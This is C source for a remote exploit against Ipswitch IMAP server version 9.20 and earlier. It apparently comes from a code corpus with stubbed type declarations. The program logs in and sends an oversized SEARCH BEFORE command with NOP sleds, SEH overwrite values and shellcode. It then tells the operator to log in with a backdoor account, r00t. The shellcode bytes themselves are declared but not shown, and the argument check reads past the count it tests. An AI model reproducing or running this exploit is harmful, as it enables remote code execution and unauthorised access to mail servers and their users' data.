
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct timeval {int tv_sec; scalar_t__ tv_usec; } ;
struct TYPE_2__ {void* s_addr; } ;
struct sockaddr_in {int sin_port; TYPE_1__ sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct fd_set {int dummy; } ;
typedef int server ;
typedef int recvbuf ;
typedef int payload ;
typedef int auth ;
typedef int WSADATA ;
typedef scalar_t__ SOCKET ;


 int AF_INET ;
 scalar_t__ FD_ISSET (scalar_t__,struct fd_set*) ;
 int FD_SET (scalar_t__,struct fd_set*) ;
 int FD_ZERO (struct fd_set*) ;
 scalar_t__ INVALID_SOCKET ;
 int MAKEWORD (int,int ) ;
 scalar_t__ SOCKET_ERROR ;
 int SOCK_STREAM ;
 int Sleep (int) ;
 int WSAConnect (scalar_t__,struct sockaddr*,int,int *,int *,int *,int *) ;
 scalar_t__ WSAStartup (int ,int *) ;
 int atoi (char*) ;
 int error (char*) ;
 int fprintf (int ,char*,...) ;
 void* htonl (int) ;
 int htons (int) ;
 int inet_addr (char*) ;
 int memset (char*,int ,int) ;
 char* nextseh ;
 int recv (scalar_t__,char*,int,int ) ;
 char* seh ;
 int select (scalar_t__,int *,struct fd_set*,int *,struct timeval*) ;
 scalar_t__ send (scalar_t__,char*,int,int ) ;
 char* shellcode ;
 scalar_t__ socket (int ,int ,int ) ;
 int stderr ;
 int strcat (char*,char*) ;
 int strlen (char*) ;
 int strncpy (char*,char*,int) ;
 int usage () ;

int main(int argc, char *argv[])
{
 SOCKET s;
 struct fd_set mask;
 struct timeval timeout;
 struct sockaddr_in server;

 char user[20], pass[20];
 char payload[2048];
 char recvbuf[1024];
 if(argc < 4)
 {
  usage();
  return 0;
 }

 if((strlen(argv[3])<15) && (strlen(argv[4])<15))
 {
  strncpy(user, argv[3], 14);
  strncpy(pass, argv[4], 14);
  user[14] = '\0';
  pass[14] = '\0';
 }
 else {
  usage();
  return 0;
 }

 int ipaddr=htonl(inet_addr(argv[1])), port=atoi(argv[2]);;

 fprintf(stderr, "Ipsbitch vs Ipswitch IMAP <=v9.20\n(C) dmc <dmc@deadbeef.co.uk>\n\n");

 char auth[50];
 memset(auth, 0, sizeof(auth));
 memset(recvbuf, 0, sizeof(recvbuf));
 strcat(auth, "0 LOGIN ");
 strcat(auth, user);
 strcat(auth, " ");
 strcat(auth, pass);
 strcat(auth, "\r\n");
 strcat(auth, "\0");

 memset(payload, 0, sizeof(payload));
 strcat(payload, "2 SEARCH BEFORE ");
 for(int i=0; i<80; i++) strcat(payload, "\x90");
 strcat(payload, nextseh);
 strcat(payload, seh);
 for(int i=0; i<100; i++) strcat(payload, "\x90");
 strcat(payload, shellcode);
 for(int i=0; i<300; i++) strcat(payload, "\x90");
 strcat(payload, "\r\n");

 WSADATA info;
    if (WSAStartup(MAKEWORD(2,0), &info)) error("Unable to start WSA");

 s=socket(AF_INET,SOCK_STREAM,0);
 if (s==INVALID_SOCKET) error("[*] socket error");
 server.sin_family=AF_INET;
 server.sin_addr.s_addr=htonl(ipaddr);
 server.sin_port=htons(port);

 WSAConnect(s,(struct sockaddr *)&server,sizeof(server),((void*)0),((void*)0),((void*)0),((void*)0));
 timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask);

 select(s+1,((void*)0),&mask,((void*)0),&timeout);
 if(FD_ISSET(s,&mask))
  {
   fprintf(stderr, "[*] Connecting to IMAP server\n");
   Sleep(1000);recv(s,recvbuf,200,0);
   fprintf(stderr, "[*] Got banner:\n%s\n", recvbuf);
   memset(recvbuf, 0, sizeof(recvbuf));
   fprintf(stderr, "[*] Authenticating...\n");
   if (send(s,auth,strlen(auth),0)==SOCKET_ERROR) error("[*] error sending auth payload");
   memset(auth, 0, sizeof(auth));
   Sleep(1000);recv(s,recvbuf,200,0);
   fprintf(stderr, "[*] Received:\n%s\n", recvbuf);
   memset(recvbuf, 0, sizeof(recvbuf));
   fprintf(stderr, "[*] Sending SELECT command...\n");
   if (send(s,"1 SELECT INBOX\r\n",strlen("1 SELECT INBOX\r\n"),0)==SOCKET_ERROR) error("[*] error sending auth payload");
   Sleep(1000);recv(s,recvbuf,200,0);
   fprintf(stderr, "[*] Received:\n%s\n", recvbuf);
   memset(recvbuf, 0, sizeof(recvbuf));
   Sleep(1000);recv(s,recvbuf,200,0);
   fprintf(stderr, "[*] Received:\n%s\n", recvbuf);
   fprintf(stderr, "[*] Sending exploit payload...\n");
   if (send(s,payload,strlen(payload),0)==SOCKET_ERROR) error("[*] error sending exploit payload");
   memset(payload, 0, sizeof(payload));
   fprintf(stderr, "[*] Now try USER=r00t PASS=r00tr00t!!\n");
   return 0;
  }
}
